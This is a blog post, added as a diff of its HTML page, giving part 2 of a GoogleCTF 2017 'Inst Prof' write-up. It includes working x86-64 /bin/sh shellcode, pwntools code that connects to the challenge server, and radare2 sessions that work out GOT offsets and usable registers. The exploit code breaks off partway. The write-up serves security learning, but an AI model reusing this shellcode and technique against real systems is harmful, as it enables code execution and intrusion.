@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="generator" content="Hugo 0.32-DEV" />
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="My thoughts and rambles">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <link rel="icon" type="image/png" href="/images/favicon.ico">
+
+    
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="icon" sizes="192x192" href="/images/touch/chrome-touch-icon-192x192.png">
+
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
+    <link rel="apple-touch-icon-precomposed" href="apple-touch-icon-precomposed.png">
+
+    
+    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
+    <meta name="msapplication-TileColor" content="#3372DF">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en"/>
+    <link rel="stylesheet" href="/css/ionicons.min.css"/>
+    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel="stylesheet" href="/css/hmdl-style.css"/>
+	<link rel="stylesheet" href="/css/pygment.css">
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-103806632-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+    <title>GoogleCTF 2017 - Inst Prof (Part 2)</title>
+</head>
+
+<body style="background-image: url('/images/background.jpg');">
+    <div id="MainCnt" class="hmdl-body mdl-layout mdl-js-layout has-drawer is-upgraded">        
+        <header class="mdl-layout__header mdl-layout__header--transparent mdl-layout__header--scroll">
+            <div class="mdl-layout__header-row">
+                <div class="mdl-layout-spacer"></div>
+                <nav class="mdl-navigation">
+                <a class="mdl-navigation__link" href="/">Home</a>
+                <a class="mdl-navigation__link" href="/post/">Articles</a>
+                <a class="mdl-navigation__link" href="/project/">Projects</a>
+                <a class="mdl-navigation__link" href="/about/">About</a>
+                </nav>
+            </div>
+        </header>
+        <div class="mdl-layout__drawer">
+            <nav class="mdl-navigation">
+            <a class="mdl-navigation__link" href="/">Home</a>
+            <a class="mdl-navigation__link" href="/post/">Articles</a>
+            <a class="mdl-navigation__link" href="/project/">Projects</a>
+            <a class="mdl-navigation__link" href="/about/">About</a>
+            </nav>
+        </div>
+
+        <main class="mdl-layout__content">
+
+		
+
+            <div class="hmdl-page mdl-grid">
+                <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+                    <div class="mdl-card__media mdl-color-text--grey-50" style=" background-color:orange;">
+                        <h3 style="color:white;">GoogleCTF 2017 - Inst Prof (Part 2)</h3>
+                    </div>
+                    <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
+                        <div class="minilogo" style="background-image: url('/images/avatar-64x64.png');"></div>
+
+                        <div>
+							<strong>
+                            		<strong>Tzaoh</strong>
+							</strong>
+                            <span>Sep 24, 2017</span>
+                        </div>
+                        <div class="section-spacer"></div>
+                    </div>
+                    <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
+                        
+
+<p><img src="/assets/GoogleCTF2017/Inst Prof/1-inst_prof_description.png" alt="inst_prof Description" /></p>
+
+<h4 id="introduction">Introduction</h4>
+
+<p>This post is the second part of the solucion of <strong>Inst Prof</strong>, an initial challenge of the GoogleCTF 2017.<br />
+Basically, the analysis phase was already donein <a href="../inst_prof_p1">part1</a>, so, in this post, we are going to
+focus with the exploitation phase.</p>
+
+<hr />
+
+<h4 id="flash-reminder">Flash reminder</h4>
+
+<p>Just to remember what we explained in <a href="../inst_prof_p1">part 1</a>, here is an easy list with the normal flow of
+the process. Here is a <a href="/assets/GoogleCTF2017/Inst Prof/inst_prof.patched">patched version of the binary</a> as
+we explained in the part 1.</p>
+
+<ol>
+<li><p>It allocates a memory page of <code>0x1000</code> bytes with read and write privileges (remember the <code>PROT_READ | PROT_WRITE</code> stuff).</p></li>
+
+<li><p>It copies the following instructions inside of this newly-allocated page:<br />
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span><span class="k"> </span>           <span class="s">0x7fd4a1197000</span>      b900100000     <span class="k">ecx</span> <span class="o">=</span> <span class="mh">0x1000</span>            
+<span class="k"> </span>       <span class="k">┌─&gt;</span> <span class="s">0x7fd4a1197005</span>      90                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7fd4a1197006</span>      90                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7fd4a1197007</span>      90                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7fd4a1197008</span>      90                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7fd4a1197009</span>      83e901         <span class="k">ecx</span> <span class="o">-=</span> <span class="m">1</span>                
+<span class="k"> </span>       <span class="k">└─&lt;</span> <span class="s">0x7fd4a119700c</span>      75f7           <span class="mh">if</span> (<span class="mh">var</span>) <span class="mh">goto</span> <span class="mh">0x7fd4a1197005</span>
+<span class="k"> </span>           <span class="s">0x7fd4a119700e</span>      c3                                     
+</code></pre></div>
+</p></li>
+
+<li><p>Later on, it reads an input from <code>stdin</code> and uses the first <code>4 bytes</code> to overwrite the <code>nop</code> opcodes we
+saw
+in the previous point (those <code>90</code>). For example, if we input the character <code>\xc3</code> (which is the opcode for <code>ret</code> instruction) four times, we will get this:<br />
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>$ r2 -Ad -R &quot;stdin=\&quot;`echo -ne &quot;\xc3\xc3\xc3\xc3&quot;`\&quot;&quot; -c &#39;dcu `/r sym.read_inst~[1]`; dso; pd 8 @ r:rbx;&#39; inst_prof
+<span class="k"> </span>           <span class="s">0x7f6b63902000</span>      b900100000     <span class="k">ecx</span> <span class="o">=</span> <span class="mh">0x1000</span>            
+<span class="k"> </span>       <span class="k">┌─&gt;</span> <span class="s">0x7f6b63902005</span>      c3                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f6b63902006</span>      c3                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f6b63902007</span>      c3                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f6b63902008</span>      c3                                     
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f6b63902009</span>      83e901         <span class="k">ecx</span> <span class="o">-=</span> <span class="m">1</span>                
+<span class="k"> </span>       <span class="k">└─&lt;</span> <span class="s">0x7f6b6390200c</span>      75f7           <span class="mh">if</span> (<span class="mh">var</span>) <span class="mh">goto</span> <span class="mh">0x7f6b63902005</span> <span class="c">; likely</span>
+<span class="k"> </span>           <span class="s">0x7f6b6390200e</span>      c3                                     
+</code></pre></div>
+</p></li>
+
+<li><p>It uses a function called <code>sym.make_page_executable</code> to update the permissions of the above memory region where the code resides. These permissions change from <strong>read</strong> and <strong>write</strong> (-rw-) to <strong>read</strong> and <strong>execute</strong> (-r-x).</p></li>
+
+<li><p>After these permissions have been updated, the process will execute our inserted bytes or instructions.</p></li>
+
+<li><p>It deallocates de memory region.</p></li>
+
+<li><p>And it starts again.</p></li>
+</ol>
+
+<hr />
+
+<h4 id="objective">Objective</h4>
+
+<p>So, our goal is to allocate an entire <a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a> somewhere in
+memory and redirect the execution flow to it. We have some little problems regarding this:</p>
+
+<ol>
+<li><p>We have to do it using instructions formed with 4 bytes as max (remember the process will only read 4 bytes each time you send something).</p></li>
+
+<li><p>Furthermore, If the instruction provided is a 4-byte one, it will be executed <code>4096</code> (or <code>0x1000</code>) times because it will be inserted inside a loop.<br />
+If it has less, we could avoid this behavior adding an extra byte: <code>c3</code> which is the opcode for the return statement. If we use it we will break the mentioned loop.</p></li>
+
+<li><p>We need an <strong>address</strong> to write the bytes to and the section this address belongs to must have execution permissions.</p></li>
+
+<li><p>We will need to save some stuff on the registers, i.e. the address we are going to copy our shellcode to. We will need to identify which registers are <strong>not used</strong> from our first input to the next one.</p></li>
+</ol>
+
+<hr />
+
+<h4 id="how-to">How to</h4>
+
+<p>To code an exploit, I decided to use python along with a fully recommended library called <a href="https://github.com/Gallopsled/pwntools">pwntools</a>.<br />
+The main reasons to use this library are:</p>
+
+<ol>
+<li><p>It allows us to start a local process or to connect to a remote one with a single line and in a simple way. Just like this:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># Execute the local binary</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./inst_prof&quot;</span><span class="p">)</span>
+<span class="c1"># Connect to the remote process</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;inst-prof.ctfcompetition.com&quot;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</code></pre></div></li>
+
+<li><p>Instead of sending the opcodes directly we can use the <code>asm()</code> method. Have in mind we should tell
+<code>pwntools</code> which architecture and operating system we are expecting. We do this through the <code>context()</code>
+method. An example of this would be:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r13, [rsp]&#39;</span><span class="p">))</span>
+</code></pre></div></li>
+</ol>
+
+<p>All right, so first we need a shellcode. I am using <a href="/assets/GoogleCTF2017/Inst Prof/shellcode.asm">my own</a>, but
+you can search for <a href="https://www.google.com/search?q=shellcode+bin+sh+x64+linux">another</a> if you want (have in mind that not all of them works).</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="s2">&quot;</span><span class="se">\xb0\x3b\x99\x48\xbb\x2f</span><span class="s2">&quot;</span>
+    <span class="s2">&quot;</span><span class="se">\x62\x69\x6e\x2f\x2f\x73</span><span class="s2">&quot;</span>
+    <span class="s2">&quot;</span><span class="se">\x68\x52\x53\x54\x5f\x52</span><span class="s2">&quot;</span>
+    <span class="s2">&quot;</span><span class="se">\x57\x54\x5e\x0f\x05</span><span class="s2">&quot;</span>
+<span class="p">)</span>
+</code></pre></div>
+
+<p>We can copy the shellcode byte by byte using the following asm instruction:</p>
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span></span><span class="nf">mov</span> <span class="no">byte</span> <span class="p">[</span><span class="no">r15</span><span class="p">],</span> <span class="err">{</span><span class="no">byte</span><span class="err">}</span>
+</code></pre></div>
+
+<p>Lets check how many bytes that instruction requires. We are going to try it with the first byte of the above shellcode:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ rasm2 -a x86 -c <span class="m">64</span> <span class="s1">&#39;mov byte [r15], 0xb0&#39;</span>
+41c607b0
+</code></pre></div>
+
+<blockquote>
+<p><code>-a x86</code> tells <code>rasm2</code> to compile the instruction for the architecture <code>x86</code>.<br />
+<code>-c 64</code> indicates we want it for a 64 bits cpu.</p>
+</blockquote>
+
+<p>Four bytes. That means that we cannot apply a <code>ret</code> instruction.
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[0x7f556238a000 230 /root/inst_prof]&gt; pd $r @ map.unk2._rw_
+<span class="k"> </span>           <span class="s">0x7f556238a000</span>      b900100000             <span class="k">ecx</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<span class="hll"><span class="k"> </span>       <span class="k">┌─&gt;</span> <span class="s">0x7f556238a005</span>      41c607b0               byte [<span class="k">r15</span>] <span class="o">=</span> <span class="mh">0xb0</span>
+</span><span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f556238a009</span>      83e901                 <span class="k">ecx</span> <span class="o">-=</span> <span class="m">1</span>
+<span class="k"> </span>       <span class="k">└─&lt;</span> <span class="s">0x7f556238a00c</span>      75f7                   <span class="mh">if</span> (<span class="mh">var</span>) <span class="mh">goto</span> <span class="mh">0x7f556238a005</span>
+<span class="k"> </span>           <span class="s">0x7f556238a00e</span>      c3                     
+</code></pre></div>
+</p>
+
+<p>So the loop will write <code>4096</code> times <code>0xb0</code> on the same address. Fair enough, it is a waste of cycles but it will
+work. This way we can copy the 23 bytes of the shellcode.</p>
+
+<p>We still need to know a couple things more:</p>
+
+<p><strong>1.</strong> an initial <strong>address</strong> where to start writing our shellcode to. Ideally, we would want to use a memory area
+with <code>write</code> and <code>execution</code> permissions, but there is none. So we will use a section that has at least <code>write</code>
+permissions like the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> section and we will deal with the
+execution permission later.</p>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x5569ad584b18</span>]<span class="o">&gt;</span> <span class="nf">dm</span>~rwx
+[<span class="mh">0x5569ad584b18</span>]<span class="o">&gt;</span> <span class="nf">dm</span>~rw-
+<span class="hll"><span class="s">usr</span>     <span class="k">4K</span> <span class="mh">0x00005569ad786000</span> <span class="o">-</span> <span class="mh">0x00005569ad787000</span> s <span class="o">-rw-</span> <span class="o">/</span>root<span class="o">/</span>inst<span class="o">_</span>prof <span class="o">/</span>root<span class="o">/</span>inst<span class="o">_</span>prof <span class="o">;</span> obj<span class="o">._</span>GLOBAL<span class="o">_</span>OFFSET<span class="o">_</span>TABLE<span class="o">_</span>
+</span><span class="s">usr</span>     <span class="k">8K</span> <span class="mh">0x00007f0efa979000</span> <span class="o">-</span> <span class="mh">0x00007f0efa97b000</span> s <span class="o">-rw-</span> <span class="o">/</span>lib<span class="o">/</span>x86<span class="o">_</span>64<span class="o">-</span>linux<span class="o">-</span>gnu<span class="o">/</span>libc<span class="o">-</span>2<span class="o">.</span>24<span class="o">.</span>so <span class="o">/</span>lib<span class="o">/</span>x86<span class="o">_</span>64<span class="o">-</span>linux<span class="o">-</span>gnu<span class="o">/</span>libc<span class="o">-</span>2<span class="o">.</span>24<span class="o">.</span>so
+<span class="s">usr</span>    <span class="k">16K</span> <span class="mh">0x00007f0efa97b000</span> <span class="o">-</span> <span class="mh">0x00007f0efa97f000</span> s <span class="o">-rw-</span> unk0 unk0
+<span class="s">usr</span>     <span class="k">8K</span> <span class="mh">0x00007f0efab80000</span> <span class="o">-</span> <span class="mh">0x00007f0efab82000</span> s <span class="o">-rw-</span> unk1 unk1
+<span class="s">usr</span>    <span class="k">12K</span> <span class="mh">0x00007f0efab9f000</span> <span class="o">-</span> <span class="mh">0x00007f0efaba2000</span> s <span class="o">-rw-</span> unk3 unk3
+<span class="s">usr</span>     <span class="k">4K</span> <span class="mh">0x00007f0efaba3000</span> <span class="o">-</span> <span class="mh">0x00007f0efaba4000</span> s <span class="o">-rw-</span> <span class="o">/</span>lib<span class="o">/</span>x86<span class="o">_</span>64<span class="o">-</span>linux<span class="o">-</span>gnu<span class="o">/</span>ld<span class="o">-</span>2<span class="o">.</span>24<span class="o">.</span>so <span class="o">/</span>lib<span class="o">/</span>x86<span class="o">_</span>64<span class="o">-</span>linux<span class="o">-</span>gnu<span class="o">/</span>ld<span class="o">-</span>2<span class="o">.</span>24<span class="o">.</span>so
+<span class="s">usr</span>     <span class="k">4K</span> <span class="mh">0x00007f0efaba4000</span> <span class="o">-</span> <span class="mh">0x00007f0efaba5000</span> s <span class="o">-rw-</span> unk4 unk4 <span class="o">;</span> map<span class="o">.</span>unk0<span class="o">._</span>rw<span class="o">_</span>
+<span class="s">usr</span>   <span class="k">132K</span> <span class="mh">0x00007ffd4fb3c000</span> <span class="o">-</span> <span class="mh">0x00007ffd4fb5d000</span> s <span class="o">-rw-</span> <span class="o">[</span>stack<span class="o">]</span> <span class="o">[</span>stack<span class="o">]</span> <span class="o">;</span> map<span class="o">._</span>stack<span class="o">_._</span>rw<span class="o">_</span>
+</code></pre></div>
+
+
+<blockquote>
+<p><code>dm</code> list the memory maps of the current process.<br />
+<code>~rwx</code> or <code>~rw-</code> is used to filter between all the mappings of the process.</p>
+</blockquote>
+
+<p>In this case <code>0x00005569ad786000</code> is the address we are looking for <strong>BUT</strong> remember <code>PIC</code> flag is enabled so our executable will be loaded at a random address each time it will be launched.</p>
+
+<p>This is a problem that can be solved thinking that even being loaded at a different place, <strong>THE DISTANCE</strong> between
+some specific points will always be the same. We will take the value the <code>rsp</code> register is pointing to (which is
+going to be a return address, the address right after the <code>call rbx</code> instruction).</p>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[0x558cfc7d3b16 230 /root/inst_prof]&gt; pd $r @ hit0_0
+<span class="k">|</span>           <span class="c">;-- hit0_0:</span>
+<span class="k">│</span>           <span class="s">0x558cfc7d3b16</span> b    <span class="m">ffd3</span>           <span class="k">rbx</span> ()
+<span class="hll"><span class="k">│</span>           <span class="s">0x558cfc7d3b18</span>      0f31                 
+</span><span class="k">│</span>           <span class="s">0x558cfc7d3b1a</span>      bf01000000     <span class="k">edi</span> <span class="o">=</span> <span class="m">1</span>
+<span class="k">│</span>           <span class="s">0x558cfc7d3b1f</span>      48c1e220       <span class="k">rdx</span> <span class="k">&lt;&lt;&lt;</span><span class="o">=</span> <span class="mh">0x20</span>
+</code></pre></div>
+
+
+<p>and get the difference between that address and the address of the GOT.</p>
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x7f8b1803b000</span>]<span class="o">&gt;</span> ? section..got.plt - [rsp]
+2<span class="mh">102504</span> <span class="mh">0x2014e8</span> <span class="mh">010012350</span> <span class="mh">2</span>M <span class="mh">20000</span><span class="o">:</span><span class="mh">04e8</span> <span class="mh">2102504</span> <span class="err">&quot;\</span>xe<span class="mh">8</span><span class="err">\</span>x<span class="mh">14</span> <span class="err">&quot;</span> <span class="mh">001000000001010011101000</span> <span class="mh">2102504</span><span class="o">.</span><span class="mh">0</span> <span class="mh">2102504</span><span class="o">.</span><span class="mh">000000f</span> <span class="mh">2102504</span><span class="o">.</span><span class="mh">000000</span>
+</code></pre></div>
+
+<p>This way we will not need to worry about where is the <code>GOT</code> located: it will always be at <code>[rsp] + 0x2014e8</code>. We
+will need to generate that value on runtime and save it into a register. Once it will be generated, we will use it
+to store our shellcode there.</p>
+
+<p><strong>2.</strong> and we will need a <strong>register</strong> to store that generated address.</p>
+
+<p>But we can not use one the register we want because is possible it is going that the process is using it to do
+other stuff and we dont want to crash the program for being careless.<br />
+To know which registers we can use, we will:</p>
+
+<ol>
+<li><p>stop the execution just before the first 4 input bytes</p></li>
+
+<li><p>alter some registers (I altered <code>r13</code>, <code>r14</code> and <code>r15</code> but you can try the ones you want, just remember you will maybe need the values of these registers to generate <code>0x2014e8</code>),</p></li>
+
+<li><p>and read another 4 bytes to check if after one loop any of our chosen registers have been changed.</p></li>
+</ol>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>$ r2 -Ad -R &quot;stdin=\&quot;`python -c &#39;print(\&quot;\xc3\&quot; * 8)&#39;`\&quot;&quot; -c &#39;dcu main; db `/a call rbx~[0]`; dc; ds 2; dr r13=0x1111; dr r14=0x2222; dr r15=0x3333; Vpp&#39; inst_prof
+- offset <span class="o">-</span>       <span class="mh">0</span> <span class="mh">1</span>  <span class="mh">2</span> <span class="mh">3</span>  <span class="mh">4</span> <span class="mh">5</span>  <span class="mh">6</span> <span class="mh">7</span>  <span class="mh">8</span> <span class="mh">9</span>  A B  C D  E F  <span class="mh">0123456789</span>ABCDEF
+<span class="s">0x7fffb7fbd398</span>  <span class="mh">182b c6a0 6755 0000 a02c f36e 167f 0000</span>  .+..gU...,.n....
+<span class="s">0x7fffb7fbd3a8</span>  <span class="mh">0000 0000 0000 0000 0000 0000 0000 0000</span>  ................
+<span class="s">0x7fffb7fbd3b8</span>  <span class="mh">c928 c6a0 6755 0000 d0d3 fbb7 ff7f 0000</span>  .(..gU..........
+<span class="s">0x7fffb7fbd3c8</span>  <span class="mh">c728 c6a0 6755 0000 602b c6a0 6755 0000</span>  .(..gU..`+..gU..
+<span class="k"> rax</span> <span class="mh">0x00000000</span>           <span class="k">rbx</span> <span class="mh">0x7f166f142000</span>       <span class="k">rcx</span> <span class="mh">0x00001000</span>
+<span class="k"> rdx</span> <span class="mh">0x4e0200000000</span>        <span class="k">r8</span> <span class="mh">0xffffffffffffffff</span>    <span class="k">r9</span> <span class="mh">0x00000000</span>
+<span class="k"> r10</span> <span class="mh">0x00000487</span>           <span class="k">r11</span> <span class="mh">0x00000202</span>           <span class="k">r12</span> <span class="mh">0x4e029a1c56e7</span>
+<span class="k"> r13</span> <span class="mh">0x00001111</span>           <span class="k">r14</span> <span class="mh">0x00002222</span>           <span class="k">r15</span> <span class="mh">0x00003333</span>
+<span class="k"> rsi</span> <span class="mh">0x00001000</span>           <span class="k">rdi</span> <span class="mh">0x7f166f142000</span>       <span class="k">rsp</span> <span class="mh">0x7fffb7fbd398</span>
+<span class="hll"><span class="k"> rbp</span> <span class="mh">0x7fffb7fbd3c0</span>       <span class="k">rip</span> <span class="mh">0x7f166f142005</span>       <span class="k">rflags</span> <span class="m">1</span><span class="err">PI</span>
+</span>orax <span class="mh">0xffffffffffffffff</span>
+<span class="k"> </span>           <span class="c">;-- rbx:</span>
+<span class="k"> </span>           <span class="c">;-- rdi:</span>
+<span class="k"> </span>           <span class="s">0x7f166f142000</span>      b900100000     <span class="k">ecx</span> <span class="o">=</span> <span class="mh">0x1000</span>            <span class="c">; rsi</span>
+<span class="k"> </span>       <span class="k">┌─&gt;</span> <span class="c">;-- rip:</span>
+<span class="k"> </span>       <span class="k">┌─&gt;</span> <span class="s">0x7f166f142005</span>      c3 
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f166f142006</span>      c3 
+<span class="hll"><span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f166f142007</span>      c3 
+</span><span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f166f142008</span>      c3 
+<span class="k"> </span>       <span class="k">|</span>   <span class="s">0x7f166f142009</span>      83e901         <span class="k">ecx</span> <span class="o">-=</span> <span class="m">1</span>
+<span class="k"> </span>       <span class="k">└─&lt;</span> <span class="s">0x7f166f14200c</span>      75f7           <span class="mh">if</span> (<span class="mh">var</span>) <span class="mh">goto</span> <span class="mh">0x7f166f142005</span> <span class="c">;[1] ; rip; likely</span>
+<span class="k"> </span>           <span class="s">0x7f166f14200e</span>      c3 
+</code></pre></div>
+
+
+<blockquote>
+<p><code>r2 -Ad ... inst_prof</code>: Analyze and open for debugging the specified binary.<br />
+<code>-R &quot;stdin=\&quot;`python -c 'print(\&quot;\xc3\&quot; * 8)'`\&quot;&quot;</code>: This is just to generate 8 <code>\xc3</code> bytes for the standard
+input.<br />
+<code>dcu main</code>: Execute until <code>main</code> is reached.<br />
+<code>db `/a call rbx~[0]`</code>: Once <code>main</code> is reached, we can search for the address of the <code>call rbx</code> instruction and
+place a breakpoint there
+<code>dc; 2ds;</code>: We continue the execution with <code>dc</code> until we reach the breakpoint we&rsquo;ve just set and we move 2
+instructions from there.
+<code>dr r13=0x1111; dr r14=0x2222; dr r15=0x3333;</code>: change the values of 3 registers.<br />
+<code>Vpp</code>: To activate visual mode.</p>
+</blockquote>
+
+<p>In short, with the latest command we are sending two inputs of <code>4 bytes</code> each. These 4 bytes groups are <code>\xc3\xc3\xc3\xc3</code>, which means 4 <code>ret</code> instructions.</p>
+
+<p>With the first input, we stop at the first <code>ret</code> opcode and once there, we change the value of some registers and resume the flow execution.</p>
+
+<p>If the values of the registers we modified are the same in the next iteration of <code>do_test</code>, it will mean those registers are reliable to be used in our exploit.</p>
+
+<p>After activating the visual mode with <code>Vpp</code>, press <code>:</code> and type <code>dc;ds</code> now. We are in the next iteration of the
+loop with the following 4 bytes. As you see, <code>r13</code> <code>r14</code> and <code>r15</code> has still the same values, so we can assume we
+can use those 3 registers in our exploit.
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[0x7fa647873000 230 /root/inst_prof]&gt; ?0;f tmp;s.. @ rbx 
+- offset <span class="o">-</span>       <span class="mh">0</span> <span class="mh">1</span>  <span class="mh">2</span> <span class="mh">3</span>  <span class="mh">4</span> <span class="mh">5</span>  <span class="mh">6</span> <span class="mh">7</span>  <span class="mh">8</span> <span class="mh">9</span>  A B  C D  E F  <span class="mh">0123456789</span>ABCDEF
+<span class="s">0x7ffed3ffc748</span>  <span class="mh">18eb 4887 f455 0000 a03c 6647 a67f 0000</span>  ..H..U...&lt;fG....
+<span class="s">0x7ffed3ffc758</span>  <span class="mh">5d91 fc8c 0800 0000 0000 0000 0000 0000</span>  ]...............
+<span class="s">0x7ffed3ffc768</span>  <span class="mh">c9e8 4887 f455 0000 80c7 ffd3 fe7f 0000</span>  ..H..U..........
+<span class="s">0x7ffed3ffc778</span>  <span class="mh">c7e8 4887 f455 0000 60eb 4887 f455 0000</span>  ..H..U..`.H..U..
+<span class="k"> rax</span> <span class="mh">0x00000000</span>           <span class="k">rbx</span> <span class="mh">0x7fa647873000</span>       <span class="k">rcx</span> <span class="mh">0x7fa64739b4c7</span>     
+<span class="k"> rdx</span> <span class="mh">0xf26700000000</span>        <span class="k">r8</span> <span class="mh">0xffffffffffffffff</span>    <span class="k">r9</span> <span class="mh">0x00000000</span>         
+<span class="k"> r10</span> <span class="mh">0x00000022</span>           <span class="k">r11</span> <span class="mh">0x00000246</span>           <span class="k">r12</span> <span class="mh">0xf267c0c00651</span>     
+<span class="hll"><span class="k"> r13</span> <span class="mh">0x00001111</span>           <span class="k">r14</span> <span class="mh">0x00002222</span>           <span class="k">r15</span> <span class="mh">0x00003333</span>         
+</span><span class="k"> rsi</span> <span class="mh">0x00001000</span>           <span class="k">rdi</span> <span class="mh">0x7fa647873000</span>       <span class="k">rsp</span> <span class="mh">0x7ffed3ffc748</span>     
+<span class="k"> rbp</span> <span class="mh">0x7ffed3ffc770</span>       <span class="k">rip</span> <span class="mh">0x7fa647873000</span>       <span class="k">rflags</span> <span class="m">1</span><span class="err">I</span>              
+orax <span class="mh">0xffffffffffffffff</span>               
+</code></pre></div>
+</p>
+
+<hr />
+
+<h4 id="ufff-alright-what-s-next">Ufff.. alright! what&rsquo;s next?</h4>
+
+<p>Now it is time to find out how we generate the magic value <code>0x2014e8</code>. To do that, lets see which values we have at
+our disposal checking the registers at the first iteration of <code>do_test</code>.<br />
+Once we get it we will add that value to <code>[rsp]</code> (not rsp but the value it points too) and save it in one of our
+three registers (<code>r13</code>, <code>r14</code> or <code>r15</code>) to use it later.</p>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>$ r2 -Ad -R &quot;stdin=\&quot;`python -c &#39;print(\&quot;\xc3\&quot; * 8)&#39;`\&quot;&quot; -c &#39;dcu main; dcu `/a call rbx~[0]`; ds; dr=&#39; inst_prof
+<span class="k"> rax</span> <span class="mh">0x00000000</span>           <span class="k">rbx</span> <span class="mh">0x7f7d18d63000</span>       <span class="k">rcx</span> <span class="mh">0x7f7d1888b4c7</span>
+<span class="k"> rdx</span> <span class="mh">0x10b2e00000000</span>       <span class="k">r8</span> <span class="mh">0xffffffffffffffff</span>    <span class="k">r9</span> <span class="mh">0x00000000</span>
+<span class="k"> r10</span> <span class="mh">0x00000487</span>           <span class="k">r11</span> <span class="mh">0x00000206</span>           <span class="k">r12</span> <span class="mh">0x10b2efa655245</span>
+<span class="hll"><span class="k"> r13</span> <span class="mh">0x7ffe8c2b98a0</span>       <span class="k">r14</span> <span class="mh">0x00000000</span>           <span class="k">r15</span> <span class="mh">0x00000000</span>
+</span><span class="k"> rsi</span> <span class="mh">0x00001000</span>           <span class="k">rdi</span> <span class="mh">0x7f7d18d63000</span>       <span class="k">rsp</span> <span class="mh">0x7ffe8c2b9790</span>
+<span class="k"> rbp</span> <span class="mh">0x7ffe8c2b97b0</span>       <span class="k">rip</span> <span class="mh">0x561095b73b16</span>       <span class="k">rflags</span> <span class="m">1</span><span class="err">I</span>
+orax <span class="mh">0xffffffffffffffff</span>  
+</code></pre></div>
+
+
+<p>I started like this:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="n">ret</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;ret&#39;</span><span class="p">)</span>                            <span class="c1"># &quot;\xc3&quot;</span>
+
+<span class="c1"># We store the content rsp is pointing to in r13.</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r13, [rsp]&#39;</span><span class="p">))</span>               <span class="c1"># &quot;\x4c\x8b\x2c\x24&quot; 4 bytes! so we can not append a ret instrucction. </span>
+<span class="c1"># This is going to be executed 0x1000 times which is not going to suppose a problem.</span>
+
+<span class="c1"># We need to get 0x2014e8 and add it to r13</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;add r15, 0x20&#39;</span><span class="p">))</span>                <span class="c1"># &quot;\x49\x83\xc7\x20&quot; -&gt; r15 = 0x20 * 0x1000 -&gt; 0x20000</span>
+<span class="c1"># Again, remember that the instruction will be executed 0x1000 times if we do not add a &quot;ret&quot; opcode.</span>
